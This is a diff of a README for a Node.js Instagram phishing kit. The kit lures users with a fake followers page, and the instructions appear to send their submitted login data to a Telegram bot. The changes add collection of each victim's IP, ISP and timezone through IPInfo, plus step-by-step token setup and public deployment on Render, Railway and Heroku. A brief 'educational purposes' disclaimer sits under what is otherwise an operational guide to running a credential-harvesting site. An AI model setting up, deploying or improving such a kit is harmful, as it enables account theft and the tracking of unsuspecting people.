@@ -18,10 +18,11 @@ This project is a Node.js-based web application designed to simulate an Instagra
 - **Fake Followers Page**: Simulates sending followers to users with progressive updates.
 - **Session Handling**: Redirects authenticated users and prevents access to login after authentication.
 - **Anti-Resubmission Logic**: Avoids multiple data submissions from users.
+- **IP and ISP Details**: Captures user IP, ISP, and timezone information.
 
 ---
 
-## 🛠️ Technologies Used
+## 🔧 Technologies Used
 
 - **Frontend**: HTML, CSS, JavaScript
 - **Backend**: Node.js, Express.js
@@ -36,8 +37,7 @@ This project is a Node.js-based web application designed to simulate an Instagra
 ### 1. **Clone the Repository**
 
 ```bash
-cd ~  # Navigate to your preferred directory
-git clone https://github.com/your-repo/instagram-phishing.git
+git clone https://github.com/v4t3rnomfr/instagram-phishing.git
 cd instagram-phishing
 ```
 
@@ -46,23 +46,36 @@ cd instagram-phishing
 Ensure you have Node.js installed. Download it from [Node.js Official Site](https://nodejs.org/).
 
 ```bash
-npm install
+npm install --force
 ```
 
-### 3. **Configure Environment Variables**
+### 3. **Create Environment Variables File (.env)**
 
-- Open the `app.js` file and update the following lines:
-  - Line 12: Replace `TELEGRAM_BOT_TOKEN` with your Telegram Bot Token.
-  - Line 13: Replace `TELEGRAM_CHAT_ID` with your Telegram chat ID.
-  - Line 21: Replace `SESSION_SECRET` with your custom session secret.
+1. In the root of your project, create a `.env` file:
+   ```bash
+   touch .env
+   ```
+2. Open the `.env` file and add the following variables (use your own tokens and secrets):
+   ```env
+   TELEGRAM_BOT_TOKEN=your_telegram_bot_token
+   TELEGRAM_CHAT_ID=your_telegram_chat_id
+   IPINFO_TOKEN=your_ipinfo_token
+   SESSION_SECRET=your_custom_secret
+   ```
 
-#### Steps to Get Telegram Bot Token and Chat ID:
-1. **Create a Bot**:
+   - **TELEGRAM_BOT_TOKEN**: Token for your Telegram bot (explained below).
+   - **TELEGRAM_CHAT_ID**: Chat ID for your Telegram bot (explained below).
+   - **IPINFO_TOKEN**: Token from IPInfo for fetching IP and location details.
+   - **SESSION_SECRET**: A very strong and unique session secret (e.g., use a password generator).
+
+#### Steps to Get Required Tokens:
+
+1. **Telegram Bot Token**:
    - Open Telegram and search for **BotFather**.
    - Send `/newbot` and follow the instructions to create a bot.
    - Copy the token provided by BotFather.
 
-2. **Get Your Chat ID**:
+2. **Telegram Chat ID**:
    - Open your Telegram bot and send a `/start` message.
    - Visit the URL:
      ```
@@ -71,13 +84,12 @@ npm install
    - Replace `<your_bot_token>` with your actual token.
    - Look for `chat.id` in the response. This is your chat ID.
 
-3. **Environment File**:
-   - Create a `.env` file in the root of your project:
-     ```env
-     TELEGRAM_BOT_TOKEN=your_telegram_bot_token
-     TELEGRAM_CHAT_ID=your_telegram_chat_id
-     SESSION_SECRET=your_custom_secret
-     ```
+3. **IPInfo Token**:
+   - Go to [IPInfo](https://ipinfo.io/) and create a free account.
+   - Generate an API token from your dashboard.
+
+4. **Session Secret**:
+   - Use a strong password generator to create a unique and secure string.
 
 ### 4. **Run the Application**
 
@@ -96,14 +108,14 @@ Visit `http://localhost:3000` to access the app.
 - Steps:
   - Push your code to GitHub.
   - Connect Render to your GitHub repository.
-  - Configure Build Command: `npm install` and Start Command: `node app.js`.
+  - Configure Build Command: `npm install --force` and Start Command: `node app.js`.
 
 ### **2. Railway**
 - [Railway](https://railway.app/) offers free hosting with minimal setup.
 - Steps:
   - Push your project to GitHub.
   - Link Railway to your repository.
-  - Add environment variables for `TELEGRAM_BOT_TOKEN`, `TELEGRAM_CHAT_ID`, and `SESSION_SECRET`.
+  - Add environment variables for `TELEGRAM_BOT_TOKEN`, `TELEGRAM_CHAT_ID`, `IPINFO_TOKEN`, and `SESSION_SECRET`.
 
 ### **3. Heroku**
 - [Heroku](https://www.heroku.com/) is popular for Node.js hosting.
@@ -115,7 +127,7 @@ Visit `http://localhost:3000` to access the app.
   - Deploy your app:
     ```bash
     heroku create
-    git push heroku master
+    git push heroku main
     ```
   - Add environment variables using:
     ```bash
@@ -124,7 +136,44 @@ Visit `http://localhost:3000` to access the app.
 
 ---
 
-## 🖥️ Testing the Application
+## 🖥️ Adding to Your GitHub Repository
+
+1. **Install Git**:
+   - Download and install Git from [Git Official Site](https://git-scm.com/).
+   - Verify installation:
+     ```bash
+     git --version
+     ```
+
+2. **Initialize Git in Your Project**:
+   ```bash
+   git init
+   ```
+
+3. **Add Files to Repository**:
+   ```bash
+   git add .
+   ```
+
+4. **Commit Changes**:
+   ```bash
+   git commit -m "Initial commit"
+   ```
+
+5. **Add Remote Repository**:
+   ```bash
+   git remote add origin https://github.com/your-username/your-repository.git
+   ```
+
+6. **Push to GitHub**:
+   ```bash
+   git branch -M main
+   git push -u origin main
+   ```
+
+---
+
+## 🔢 Testing the Application
 
 1. **Login Simulation**:
    - Navigate to `http://localhost:3000`.
@@ -144,7 +193,7 @@ Visit `http://localhost:3000` to access the app.
 
 ---
 
-## 🛡️ Security Measures
+## 🔒 Security Measures
 
 - **Session-Based Authentication**: Prevents unauthorized access to `/followers`.
 - **Input Validation**: Ensures valid data is submitted.
@@ -158,3 +207,4 @@ Visit `http://localhost:3000` to access the app.
 This project is a **proof of concept** and should only be used for **educational purposes**. Unauthorized use to collect sensitive data from individuals without consent is illegal and unethical.
 
 ---
+
